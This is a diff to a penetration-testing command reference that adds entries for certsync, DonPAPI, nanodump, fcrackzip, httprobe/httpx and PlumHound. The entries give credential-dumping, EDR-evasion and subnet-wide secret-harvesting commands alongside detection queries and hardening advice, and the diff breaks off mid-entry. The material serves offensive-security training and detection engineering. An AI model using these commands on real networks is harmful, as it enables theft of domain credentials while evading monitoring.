@@ -20404,6 +20404,107 @@ const COMMAND_DATA = {
       "explain": "certipy-ad is the Linux Swiss-army knife for AD CS (certificate services) enumeration and abuse:\n  find                     enumerate CAs and templates\n  -u <user>@<domain> -p <password>   authenticate to the DC\n  -dc-ip <dc_ip>           the Domain Controller / LDAP target\n  -vulnerable              show only templates vulnerable to ESC1-ESC16\n  -stdout                  print results to the terminal instead of a file\nSwap the verb (req to enroll a cert, auth to PKINIT, shadow, account update) to escalate from a readable misconfiguration to a privileged TGT / NT hash."
     },
     {
+      "id": "ad-certsync",
+      "name": "certsync - NTDS Dump via ADCS (No DRSUAPI)",
+      "command": "certsync -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -ns <dc_ip>",
+      "description": "certsync dumps NTDS secrets without using DRSUAPI (DCSync). It enumerates users via LDAP, retrieves the CA certificate and private key, forges certificates for each user, then uses PKINIT + UnPAC-the-hash to recover NT hashes. This evades DCSync-focused detections and works even where replication is monitored or restricted.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Credential Dumping",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "zblurx/certsync",
+      "tags": [
+        "certsync",
+        "ntds",
+        "dcsync",
+        "adcs",
+        "pkinit",
+        "unpac-the-hash",
+        "ca-key"
+      ],
+      "mitre": [
+        "T1003.006",
+        "T1649"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== REQUIREMENTS ===\n  # Access to the CA private key (e.g. via Certipy -backup, or ESC chain, or admin on CA)\n  # Or run the full flow if you can extract the CA key\n\n=== DUMP NTDS WITHOUT DCSYNC ===\n  certsync -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -ns <dc_ip>\n\n=== PROVIDE CA KEY/CERT EXPLICITLY ===\n  certsync -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -ns <dc_ip> \\\n    -ca-pfx ca.pfx\n\n=== HOW IT WORKS ===\n  1. LDAP: enumerate all domain users + their SIDs\n  2. Retrieve CA cert + private key (from CA host or backup)\n  3. For each user: forge a client-auth certificate\n  4. PKINIT with the forged cert to get a TGT\n  5. UnPAC-the-hash: extract the NT hash from the PAC\n  # Result: NT hashes for all users, no replication (DRSUAPI) call\n\n=== ALTERNATIVES ===\n  secretsdump.py @dc  # classic DCSync (DRSUAPI) - more detectable\n  certipy ca -backup  # grab the CA key first\n  ntdsutil / ntds.dit + VSS  # on-host DB copy",
+      "examples": [
+        {
+          "label": "NTDS dump without DRSUAPI",
+          "command": "certsync -u jdoe -p Passw0rd! -d corp.local -dc-ip 10.10.10.5 -ns 10.10.10.5"
+        },
+        {
+          "label": "With explicit CA pfx",
+          "command": "certsync -u jdoe -p Passw0rd! -d corp.local -dc-ip 10.10.10.5 -ns 10.10.10.5 -ca-pfx ca.pfx"
+        }
+      ],
+      "references": [
+        {
+          "title": "certsync",
+          "url": "https://github.com/zblurx/certsync"
+        },
+        {
+          "title": "MITRE T1003.006 - DCSync",
+          "url": "https://attack.mitre.org/techniques/T1003/006/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-secretsdump-dcsync",
+          "note": "Classic DCSync via DRSUAPI - more detectable alternative.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-certipy-toolkit",
+          "note": "Certipy backs up the CA key certsync needs.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-certifried",
+          "note": "Related ADCS certificate forgery attack.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "With the CA private key, an attacker can forge authentication certificates for any user, then exchange them for TGTs via PKINIT and recover NT hashes from the PAC (UnPAC-the-hash) - obtaining credentials without the DRSUAPI replication call that DCSync detections watch.",
+        "prerequisites": "The ADCS CA private key (via CA host compromise, Certipy -backup, or an ESC misconfiguration); LDAP read; network to DC and CA.",
+        "impact": "Full domain credential compromise (all NT hashes) while bypassing DCSync detection.",
+        "detection": "[MITRE T1003.006/T1649] Burst of certificate issuance / PKINIT (4768 with certificate pre-auth) for many distinct users from one host; CA private key access/export; absence of the usual 4662 DRSUAPI replication pattern.",
+        "artifacts": "Many Kerberos AS-REQ with PKINIT for distinct principals in a short window; CA audit events for key export; forged certs not issued through normal enrollment.",
+        "splunk_spl": "index=windows EventCode=4768 CertIssuerName=*\n| bin _time span=5m\n| stats dc(TargetUserName) as users by _time, IpAddress\n| where users > 10",
+        "elastic_kql": "event.code:4768 and winlog.event_data.CertIssuerName:*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4768 and isnotempty(CertIssuerName)\n| summarize Users=dcount(TargetUserName) by IpAddress, bin(TimeGenerated, 5m)\n| where Users > 10",
+        "sigma_rules": "win_adcs_mass_pkinit_certsync",
+        "prevention": "Protect the CA private key (HSM, restrict CA admin); monitor CA key export; enable strong certificate mapping (KB5014754); audit certificate issuance; treat CA servers as Tier-0.",
+        "sources": [
+          "zblurx/certsync",
+          "https://attack.mitre.org/techniques/T1003/006/"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Mass PKINIT authentication (certsync / cert forgery)",
+            "logic": "index=windows EventCode=4768 CertIssuerName=*\n| bin _time span=5m\n| stats dc(TargetUserName) as unique_users values(TargetUserName) as users by _time, IpAddress\n| where unique_users > 10",
+            "data_source": "windows-security",
+            "attack": [
+              "T1003.006",
+              "T1649"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Smartcard mass-logon events in high-assurance environments",
+            "tuning": "Baseline normal PKINIT volume; alert on single-source many-user bursts"
+          }
+        ]
+      }
+    },
+    {
       "id": "cewl-wordlist",
       "name": "CeWL - Scrape Site for Wordlist",
       "command": "cewl <url> -d <depth> -m <min_length> --lowercase -w wordlist.txt",
@@ -39451,6 +39552,111 @@ const COMMAND_DATA = {
       "explain": "Sprays a password across the domain from a Windows host, respecting lockout:\n  Invoke-DomainPasswordSpray   pulls the user list from AD automatically\n  -Password <password>     the single password to spray\n  -OutFile spray_success   save hits\n  -ErrorAction SilentlyContinue   suppress errors\nBy default it honors the domain lockout policy so you do not lock accounts; best when you already have a Windows foothold and no Linux box on-segment."
     },
     {
+      "id": "ad-donpapi",
+      "name": "DonPAPI - Mass DPAPI Secret Harvesting",
+      "command": "DonPAPI -u <user> -p <password> -d <domain> <target>",
+      "description": "DonPAPI remotely dumps Windows DPAPI-protected secrets at scale: browser credentials and cookies (Chrome/Edge), Windows Credential Manager vaults, Wi-Fi keys, scheduled-task creds, and more, across many hosts. It retrieves and decrypts masterkeys using the domain backup key or user hashes, avoiding touching LSASS. Ideal for post-compromise credential sweeping across a subnet.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Post-Exploitation",
+      "subcategory": "Credential Dumping",
+      "certifications": [
+        "CPTS",
+        "CRTP"
+      ],
+      "primary_cert": "CPTS",
+      "source": "login-securite/DonPAPI",
+      "tags": [
+        "donpapi",
+        "dpapi",
+        "credentials",
+        "browser-creds",
+        "masterkey",
+        "credential-manager",
+        "wifi"
+      ],
+      "mitre": [
+        "T1555.003",
+        "T1555.004"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== SINGLE HOST ===\n  DonPAPI -u <user> -p <password> -d <domain> <target>\n\n=== WITH PASS-THE-HASH ===\n  DonPAPI -u <user> -H <nt_hash> -d <domain> <target>\n\n=== SWEEP A SUBNET ===\n  DonPAPI -u <user> -p <password> -d <domain> <cidr>\n  # e.g. 10.10.10.0/24\n\n=== USE DOMAIN DPAPI BACKUP KEY (decrypt any user masterkey) ===\n  # First extract the backup key from a DC (as DA):\n  dpapi.py backupkeys -t <domain>/<user>:<password>@<dc_ip> --export\n  DonPAPI --pvk domain_backupkey.pvk -u <user> -p <password> -d <domain> <cidr>\n\n=== WHAT IT COLLECTS ===\n  - Chrome/Edge saved logins and cookies\n  - Windows Credential Manager (generic + domain creds)\n  - Wi-Fi PSKs\n  - Scheduled task credentials\n  - RDP saved creds, mRemoteNG, etc.\n\n=== OUTPUT ===\n  # Results stored in ~/.donpapi/ (SQLite + loot files)\n\n=== ALTERNATIVES ===\n  mimikatz dpapi::  # on-host, manual\n  SharpDPAPI  # C# on-host\n  lsassy / nanodump  # LSASS-based (different source)",
+      "examples": [
+        {
+          "label": "Dump DPAPI secrets from one host",
+          "command": "DonPAPI -u jdoe -p Passw0rd! -d corp.local 10.10.10.20"
+        },
+        {
+          "label": "Sweep a subnet with PtH",
+          "command": "DonPAPI -u jdoe -H aad3b435...:31d6cfe0... -d corp.local 10.10.10.0/24"
+        },
+        {
+          "label": "Decrypt with domain backup key",
+          "command": "DonPAPI --pvk domain_backupkey.pvk -u jdoe -p Passw0rd! -d corp.local 10.10.10.0/24"
+        }
+      ],
+      "references": [
+        {
+          "title": "DonPAPI",
+          "url": "https://github.com/login-securite/DonPAPI"
+        },
+        {
+          "title": "MITRE T1555.003 - Credentials from Web Browsers",
+          "url": "https://attack.mitre.org/techniques/T1555/003/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "mimikatz-dpapi-chrome",
+          "note": "On-host manual DPAPI decryption of browser creds.",
+          "rel": "alternative"
+        },
+        {
+          "id": "post-lsassy",
+          "note": "lsassy dumps LSASS (different credential source).",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-secretsdump-dcsync",
+          "note": "DCSync the domain backup key owner / get hashes to feed DonPAPI.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "DPAPI encrypts user secrets with keys derived from the user password (or the domain backup key). With the user hash or the domain backup key, an attacker decrypts masterkeys and all protected blobs remotely over SMB/RPC without touching LSASS.",
+        "prerequisites": "Admin rights on targets (to read other users DPAPI blobs); user hash/password or the domain DPAPI backup key.",
+        "impact": "Mass theft of browser passwords, cookies (session hijack), Wi-Fi keys, saved RDP/app credentials across many hosts.",
+        "detection": "[MITRE T1555.003/T1555.004] Remote access to \\Users\\*\\AppData\\...\\Protect masterkey files and browser Login Data over SMB; SMB admin-share reads of DPAPI paths from one source to many hosts.",
+        "artifacts": "SMB reads of Microsoft\\Protect\\ masterkeys and browser credential stores; RPC to retrieve backup keys from the DC (LSARPC).",
+        "splunk_spl": "index=windows EventCode=5145 RelativeTargetName=\"*\\\\Microsoft\\\\Protect\\\\*\"\n| stats dc(ComputerName) as hosts count by SubjectUserName, IpAddress\n| where hosts > 3",
+        "elastic_kql": "event.code:5145 and winlog.event_data.RelativeTargetName:*Microsoft\\\\Protect\\\\*",
+        "sentinel_kql": "DeviceFileEvents\n| where FolderPath has @\"\\Microsoft\\Protect\\\" or FolderPath has @\"\\User Data\\Default\\Login Data\"\n| summarize Hosts=dcount(DeviceName) by InitiatingProcessAccountName, bin(Timestamp, 10m)\n| where Hosts > 3",
+        "sigma_rules": "win_dpapi_masterkey_remote_access",
+        "prevention": "Protect/rotate the domain DPAPI backup key; restrict local admin (LAPS + tiering); use hardware-bound credential storage; monitor remote masterkey access; enable Credential Guard where possible.",
+        "sources": [
+          "login-securite",
+          "https://attack.mitre.org/techniques/T1555/003/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Mass DPAPI masterkey/browser credential access",
+            "logic": "DeviceFileEvents\n| where FolderPath has @\"\\Microsoft\\Protect\\\" or FolderPath endswith \"Login Data\" or FolderPath endswith \"Cookies\"\n| where InitiatingProcessAccountName !in (\"SYSTEM\")\n| summarize Hosts=dcount(DeviceName), Files=count() by InitiatingProcessAccountName, bin(Timestamp, 10m)\n| where Hosts >= 3",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1555.003",
+              "T1555.004"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Backup/EDR agents enumerating user profiles",
+            "tuning": "Exclude known management service accounts; threshold on distinct hosts touched"
+          }
+        ]
+      }
+    },
+    {
       "id": "dnn-admin-rce",
       "name": "DotNetNuke (DNN) - Authenticated RCE (SQL Console + File-Extension Bypass)",
       "command": "-- DNN SuperUser > Settings > SQL console: enable and run OS commands\nEXEC sp_configure 'show advanced options', '1'; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE;\nxp_cmdshell 'whoami'",
@@ -46828,6 +47034,92 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Screenshots every web app from an Nmap XML with EyeWitness:\n  eyewitness --web   web-app mode\n  -x web_discovery.xml   parse targets from the nmap XML\n  -d <output_dir>        report output directory\nBuilds a browsable report so you can visually triage many hosts and spot login/admin/default pages fast; -f urls.txt takes a plain URL list, --all-protocols adds RDP/VNC."
+    },
+    {
+      "id": "crack-fcrackzip",
+      "name": "fcrackzip - ZIP Archive Password Cracking",
+      "command": "fcrackzip -u -D -p <wordlist> <file>",
+      "description": "fcrackzip cracks password-protected ZIP archives via dictionary or brute-force attack directly (no hash extraction needed). Fast for quick ZIP cracks in CTF and loot scenarios. For stronger/other formats, extract a hash with zip2john and crack with hashcat/john instead.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Password Attacks",
+      "subcategory": "Archive Cracking",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Kali fcrackzip package",
+      "tags": [
+        "fcrackzip",
+        "zip",
+        "archive",
+        "password-cracking",
+        "brute-force",
+        "dictionary"
+      ],
+      "mitre": [
+        "T1110.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== DICTIONARY ATTACK ===\n  fcrackzip -u -D -p <wordlist> secret.zip\n  #  -u  unzip to verify (removes false positives)\n  #  -D  dictionary mode\n  #  -p  wordlist file\n  fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret.zip\n\n=== BRUTE FORCE ===\n  fcrackzip -u -b -c a1 -l 1-6 secret.zip\n  #  -b        brute force\n  #  -c a1     charset: lowercase + digits\n  #  -l 1-6    length range\n  #  -c aA1!   add upper + symbols\n\n=== VERBOSE / SHOW PROGRESS ===\n  fcrackzip -v -u -D -p rockyou.txt secret.zip\n\n=== PREFERRED FOR MODERN/AES ZIPS -> use john/hashcat ===\n  zip2john secret.zip > zip.hash\n  john --wordlist=rockyou.txt zip.hash\n  # or: hashcat -m 13600 zip.hash rockyou.txt   (WinZip AES)\n  # or: hashcat -m 17210/17220/17225 for PKZIP variants\n\n=== OTHER ARCHIVE FORMATS ===\n  rar2john file.rar | hashcat -m 13000\n  7z2john file.7z   | hashcat -m 11600",
+      "examples": [
+        {
+          "label": "Dictionary crack with verify",
+          "command": "fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret.zip"
+        },
+        {
+          "label": "Brute force 1-6 chars",
+          "command": "fcrackzip -u -b -c a1 -l 1-6 secret.zip"
+        },
+        {
+          "label": "Hash route for AES ZIP",
+          "command": "zip2john secret.zip > zip.hash && hashcat -m 13600 zip.hash rockyou.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "fcrackzip man page",
+          "url": "https://manpages.debian.org/fcrackzip"
+        },
+        {
+          "title": "MITRE T1110.002 - Password Cracking",
+          "url": "https://attack.mitre.org/techniques/T1110/002/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crack-zip2john",
+          "note": "Extract a ZIP hash to crack with john/hashcat (handles AES ZIPs).",
+          "rel": "alternative"
+        },
+        {
+          "id": "hashcat-dictionary",
+          "note": "Crack the extracted archive hash with hashcat.",
+          "rel": "next"
+        },
+        {
+          "id": "stego-steghide",
+          "note": "Hidden data is often in images, not just archives.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "ZIP encryption (especially legacy ZipCrypto) is weak and offline-crackable. Weak passwords fall quickly to dictionary/brute force since the attacker controls the file.",
+        "prerequisites": "Possession of the encrypted archive; a wordlist or compute for brute force.",
+        "impact": "Recovery of archive contents (often credentials, keys, documents).",
+        "detection": "Offline attacker-side activity - not detectable on the target.",
+        "artifacts": "fcrackzip/zip2john on the attacker host only.",
+        "splunk_spl": "N/A - offline attacker-side cracking",
+        "elastic_kql": "N/A - offline attacker-side cracking",
+        "sentinel_kql": "N/A - offline attacker-side cracking",
+        "sigma_rules": "N/A",
+        "prevention": "Use strong, long passphrases; use AES-256 ZIP or GPG/7z-AES instead of legacy ZipCrypto; do not ship secrets in weakly encrypted archives.",
+        "sources": [
+          "Kali docs",
+          "https://attack.mitre.org/techniques/T1110/002/"
+        ]
+      }
     },
     {
       "id": "feroxbuster-recursive",
@@ -61297,6 +61589,98 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Sends an OPTIONS request and reads the Allow response header to list the HTTP methods the server accepts.:\n  -i -X  input file / interface\n  <ip>   target IP address\nLook for a header like: Allow: POST,OPTIONS,HEAD,GET."
+    },
+    {
+      "id": "recon-httprobe",
+      "name": "httprobe / httpx - Probe for Live HTTP(S) Services",
+      "command": "cat <file> | httprobe",
+      "description": "httprobe (and the more featureful httpx) take a list of hosts/subdomains and probe which answer on HTTP and HTTPS, returning live URLs. Essential glue between subdomain enumeration and content discovery - it filters thousands of candidate hosts down to the ones actually serving web apps worth scanning.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Information Gathering",
+      "subcategory": "Web Recon",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "tomnomnom/httprobe; projectdiscovery/httpx",
+      "tags": [
+        "httprobe",
+        "httpx",
+        "http-probe",
+        "live-hosts",
+        "recon",
+        "subdomains"
+      ],
+      "mitre": [
+        "T1595.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== HTTPROBE (simple) ===\n  cat subdomains.txt | httprobe\n  # Probe non-standard ports too:\n  cat subdomains.txt | httprobe -p http:8080 -p https:8443\n\n=== HTTPX (recommended, richer) ===\n  httpx -l subdomains.txt -o live.txt\n  # With status, title, tech, length:\n  httpx -l subdomains.txt -sc -title -td -cl\n  # Only 200s:\n  httpx -l subdomains.txt -mc 200\n  # Follow redirects + probe common ports:\n  httpx -l subdomains.txt -fr -ports 80,443,8080,8443,8000\n\n=== TYPICAL PIPELINE ===\n  subfinder -d <domain> -silent | httpx -silent | nuclei\n  # subdomains -> live web -> vuln scan\n\n=== FEED INTO CONTENT DISCOVERY ===\n  httpx -l subs.txt -silent | while read u; do feroxbuster -u \"$u\"; done\n\n=== ALTERNATIVES ===\n  httprobe  # minimal, fast\n  httpx     # status/title/tech/screenshots\n  fping/nmap -p80,443  # host-level, less HTTP-aware",
+      "examples": [
+        {
+          "label": "Probe live web hosts (httprobe)",
+          "command": "cat subdomains.txt | httprobe"
+        },
+        {
+          "label": "httpx with status/title/tech",
+          "command": "httpx -l subdomains.txt -sc -title -td -cl"
+        },
+        {
+          "label": "Full recon pipeline",
+          "command": "subfinder -d example.com -silent | httpx -silent | nuclei"
+        }
+      ],
+      "references": [
+        {
+          "title": "httprobe",
+          "url": "https://github.com/tomnomnom/httprobe"
+        },
+        {
+          "title": "httpx",
+          "url": "https://github.com/projectdiscovery/httpx"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "subfinder-enum",
+          "note": "Feed subfinder output into httprobe/httpx.",
+          "rel": "prereq"
+        },
+        {
+          "id": "recon-amass-subdomains",
+          "note": "Amass is another upstream subdomain source.",
+          "rel": "prereq"
+        },
+        {
+          "id": "nuclei-vuln-scan",
+          "note": "Pipe live URLs into nuclei for vuln scanning.",
+          "rel": "next"
+        },
+        {
+          "id": "feroxbuster-recursive",
+          "note": "Run content discovery on each live host.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Probing sends ordinary HTTP(S) requests to candidate hosts. It is reconnaissance that blends with normal web traffic, especially at low rates.",
+        "prerequisites": "A list of candidate hosts/subdomains; network egress to targets.",
+        "impact": "Reveals the live web attack surface, focusing later attacks.",
+        "detection": "[MITRE T1595.002] Many root requests (\"GET /\") across many vhosts/subdomains from one source in a short window; requests to hosts with no prior traffic; default tool User-Agents.",
+        "artifacts": "Web/CDN/WAF logs showing fan-out probing; spikes of HEAD/GET / to many hostnames.",
+        "splunk_spl": "index=web uri_path=\"/\" \n| stats dc(host) as hosts count by src_ip\n| where hosts > 50",
+        "elastic_kql": "url.path:\"/\" and source.ip:*",
+        "sentinel_kql": "let probes = _Im_WebSession\n| where UrlOriginal endswith \"/\"\n| summarize Hosts=dcount(DstDvcHostname) by SrcIpAddr, bin(TimeGenerated, 10m);\nprobes | where Hosts > 50",
+        "sigma_rules": "web_mass_http_probing",
+        "prevention": "WAF rate limiting; block known scanner User-Agents; reduce exposed subdomains; monitor for fan-out probing; use allowlists on sensitive vhosts.",
+        "sources": [
+          "ProjectDiscovery docs",
+          "https://attack.mitre.org/techniques/T1595/002/"
+        ]
+      }
     },
     {
       "id": "recon-httpx-probe",
@@ -99999,6 +100383,108 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "ad-nanodump",
+      "name": "nanodump - Evasive LSASS Memory Dump",
+      "command": "nanodump.x64.exe --write C:\\Windows\\Temp\\report.docx",
+      "description": "nanodump creates a minidump of LSASS using direct syscalls and an invalid/malformed minidump signature to evade EDR and signature-based detection. It avoids MiniDumpWriteDump, can restore the dump signature offline, and supports fileless transfer. Used to harvest credentials from LSASS while bypassing common dump protections.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Post-Exploitation",
+      "subcategory": "Credential Dumping",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "fortra/nanodump",
+      "tags": [
+        "nanodump",
+        "lsass",
+        "minidump",
+        "edr-evasion",
+        "direct-syscalls",
+        "credentials"
+      ],
+      "mitre": [
+        "T1003.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== BASIC DUMP (disguised extension) ===\n  nanodump.x64.exe --write C:\\Windows\\Temp\\report.docx\n  # Dump signature is corrupted on disk to evade scanners\n\n=== RESTORE SIGNATURE OFFLINE (attacker box) ===\n  python3 restore_signature.py report.docx\n  # Then parse with pypykatz/mimikatz\n\n=== FILELESS / DOWNLOAD OVER C2 ===\n  nanodump.x64.exe --fork --write \\\\127.0.0.1\\pipe\\x\n  # BOF version runs in-process under Cobalt Strike / havoc\n\n=== KEY EVASION OPTIONS ===\n  --fork           # dump a forked clone of LSASS (less likely to be flagged)\n  --snapshot       # use PssCaptureSnapshot instead of opening LSASS directly\n  --duplicate      # duplicate an existing LSASS handle (no OpenProcess)\n  --valid          # write a valid signature (skip corruption)\n\n=== PARSE THE DUMP ===\n  pypykatz lsa minidump report.docx\n  mimikatz: sekurlsa::minidump report.docx then sekurlsa::logonpasswords\n\n=== ALTERNATIVES ===\n  procdump -ma lsass.exe  # signed LOLBin, noisier\n  comsvcs.dll MiniDump    # LOLBin one-liner\n  lsassy / pypykatz       # remote collection",
+      "examples": [
+        {
+          "label": "Evasive dump with disguised name",
+          "command": "nanodump.x64.exe --write C:\\Windows\\Temp\\report.docx"
+        },
+        {
+          "label": "Forked dump (stealthier)",
+          "command": "nanodump.x64.exe --fork --write C:\\Windows\\Temp\\out.log"
+        },
+        {
+          "label": "Parse dump offline",
+          "command": "pypykatz lsa minidump report.docx"
+        }
+      ],
+      "references": [
+        {
+          "title": "nanodump",
+          "url": "https://github.com/fortra/nanodump"
+        },
+        {
+          "title": "MITRE T1003.001 - LSASS Memory",
+          "url": "https://attack.mitre.org/techniques/T1003/001/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "post-procdump-lsass",
+          "note": "ProcDump/comsvcs LOLBin dump - noisier but signed.",
+          "rel": "alternative"
+        },
+        {
+          "id": "post-lsassy",
+          "note": "lsassy for remote LSASS collection.",
+          "rel": "alternative"
+        },
+        {
+          "id": "pypykatz-minidump",
+          "note": "Parse the resulting minidump offline.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Direct syscalls bypass userland API hooks EDR relies on; corrupting the minidump magic bytes defeats signature scanners; --fork/--snapshot/--duplicate avoid the heavily-monitored OpenProcess(LSASS) + MiniDumpWriteDump pattern.",
+        "prerequisites": "Local admin / SeDebugPrivilege on the target; nanodump binary or BOF.",
+        "impact": "Theft of plaintext passwords, NT hashes, and Kerberos tickets from LSASS while evading many EDRs.",
+        "detection": "[MITRE T1003.001] Process handle opens to lsass.exe with suspicious access masks; PssCaptureSnapshot on LSASS; process-clone (RtlCreateProcessReflection) of LSASS; use Sysmon 10 with LSASS as TargetImage; Defender ASR LSASS rule.",
+        "artifacts": "Minidump files with corrupted/odd headers; LSASS handle access from non-system processes; unusual syscall stubs.",
+        "splunk_spl": "index=windows (EventCode=10 TargetImage=\"*lsass.exe\") OR (EventCode=4656 ObjectName=\"*lsass*\")\n| stats count by SourceImage, GrantedAccess, Computer",
+        "elastic_kql": "winlog.event_id:10 and winlog.event_data.TargetImage:*lsass.exe",
+        "sentinel_kql": "DeviceEvents\n| where ActionType in (\"OpenProcessApiCall\",\"CreateRemoteThreadApiCall\") and FileName =~ \"lsass.exe\"\n| project Timestamp, DeviceName, InitiatingProcessFileName, AdditionalFields",
+        "sigma_rules": "win_lsass_memory_access_nanodump",
+        "prevention": "Enable Credential Guard; enable the Defender ASR rule blocking LSASS credential theft; run LSASS as PPL (RunAsPPL); restrict SeDebugPrivilege; EDR with kernel-level LSASS handle monitoring.",
+        "sources": [
+          "fortra/nanodump",
+          "https://attack.mitre.org/techniques/T1003/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "LSASS access via snapshot/fork (nanodump-style)",
+            "logic": "DeviceEvents\n| where ActionType == \"OpenProcessApiCall\" and FileName =~ \"lsass.exe\"\n| where InitiatingProcessFileName !in~ (\"MsMpEng.exe\",\"wininit.exe\",\"csrss.exe\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, AdditionalFields",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1003.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "AV/EDR and legitimate crash-dump tooling accessing LSASS",
+            "tuning": "Allowlist known security products; alert on unsigned/uncommon initiating processes"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -114892,6 +115378,94 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "PuTTY's command-line SSH client for a Windows foothold, opening a SOCKS proxy:\n  -ssh              use the SSH protocol\n  -D <socks_port>   dynamic forward - a local SOCKS proxy over the SSH tunnel\n  <user>@<pivot>    SSH credentials for the pivot\nGives you a SOCKS proxy on Windows; point Proxifier at it to force apps like mstsc.exe through to internal targets."
+    },
+    {
+      "id": "ad-plumhound",
+      "name": "PlumHound - BloodHound Reporting and Pathfinding",
+      "command": "python3 PlumHound.py -s \"<neo4j_host>\" -u neo4j -p <password> -x tasks/default.tasks",
+      "description": "PlumHound runs curated Cypher queries against a BloodHound neo4j database and produces blue/purple-team HTML reports: shortest paths to Domain Admins, Kerberoastable users, unconstrained delegation, stale accounts, and dozens more. Turns BloodHound graph data into actionable, reportable findings without manual Cypher.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Active Directory",
+      "subcategory": "Enumeration",
+      "certifications": [
+        "CPTS",
+        "CRTP"
+      ],
+      "primary_cert": "CPTS",
+      "source": "PlumHound/PlumHound",
+      "tags": [
+        "plumhound",
+        "bloodhound",
+        "reporting",
+        "cypher",
+        "neo4j",
+        "blue-team",
+        "purple-team"
+      ],
+      "mitre": [
+        "T1069.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== PREREQUISITE ===\n  # BloodHound data already ingested into neo4j (via SharpHound/bloodhound-python)\n\n=== RUN DEFAULT TASK LIST (full report set) ===\n  python3 PlumHound.py -s \"bolt://127.0.0.1:7687\" -u neo4j -p bloodhound -x tasks/default.tasks\n  # HTML reports land in reports/\n\n=== EASY MODE (one path report) ===\n  python3 PlumHound.py -s \"bolt://127.0.0.1:7687\" -u neo4j -p bloodhound --easy\n\n=== SINGLE CYPHER QUERY ===\n  python3 PlumHound.py -s \"bolt://127.0.0.1:7687\" -u neo4j -p bloodhound \\\n    -c \"MATCH (u:User {hasspn:true}) RETURN u.name\" --title Kerberoastable\n\n=== USEFUL BUILT-IN TASKS ===\n  - Shortest paths to Domain Admins\n  - Users with DCSync rights\n  - Unconstrained/constrained delegation\n  - Kerberoastable + AS-REP roastable accounts\n  - Computers where Domain Users can RDP/admin\n  - Stale/never-logged-on accounts\n\n=== ALTERNATIVES ===\n  GoodHound  # similar reporting, scores paths by \"busiest\"\n  BloodHound raw Cypher  # manual queries in the UI",
+      "examples": [
+        {
+          "label": "Full default report set",
+          "command": "python3 PlumHound.py -s \"bolt://127.0.0.1:7687\" -u neo4j -p bloodhound -x tasks/default.tasks"
+        },
+        {
+          "label": "Easy mode path report",
+          "command": "python3 PlumHound.py -s \"bolt://127.0.0.1:7687\" -u neo4j -p bloodhound --easy"
+        },
+        {
+          "label": "Custom Cypher to HTML",
+          "command": "python3 PlumHound.py -s \"bolt://127.0.0.1:7687\" -u neo4j -p bloodhound -c \"MATCH (u:User {hasspn:true}) RETURN u.name\" --title Kerberoastable"
+        }
+      ],
+      "references": [
+        {
+          "title": "PlumHound",
+          "url": "https://github.com/PlumHound/PlumHound"
+        },
+        {
+          "title": "MITRE T1069.002",
+          "url": "https://attack.mitre.org/techniques/T1069/002/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-bloodhound-ce",
+          "note": "PlumHound reads the neo4j DB that BloodHound populates.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-sharphound",
+          "note": "SharpHound collects the data PlumHound reports on.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-bloodhound-cypher",
+          "note": "Hand-write Cypher for queries PlumHound tasks do not cover.",
